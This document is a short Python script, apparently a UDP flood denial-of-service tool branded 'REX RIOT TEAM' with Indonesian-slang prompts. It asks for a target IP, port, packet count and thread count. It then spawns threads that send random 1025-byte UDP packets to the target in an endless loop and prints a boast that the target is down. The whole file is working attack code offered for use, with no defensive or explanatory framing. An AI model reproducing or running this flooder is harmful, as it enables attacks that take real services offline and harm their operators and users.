import random
import socket
import threading
import os,sys

os.system("clear")
print("\033[91m")

ip = str(input("\033[0mIP BG GANTENG  : "))
port = int(input("\033[0mPORT BG GANTENG  : "))
times = int(input("\033[0mPAKET NYA BG : "))
threads = int(input("\033[0mTHREADS : "))
os.system("clear")
def ddos():
    data = random._urandom(1025)
    i = random.choice(("\033[91m[Attack By]","\033[91m[Attack By]","\033[91m[Attack By]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"\033[94m REX RIOT TEAM!!!")
        except:
            print("\033[91m[!] YEH DOWN ASUH!!!")

for y in range(threads):
  th = threading.Thread(target = ddos)
  th.start()  
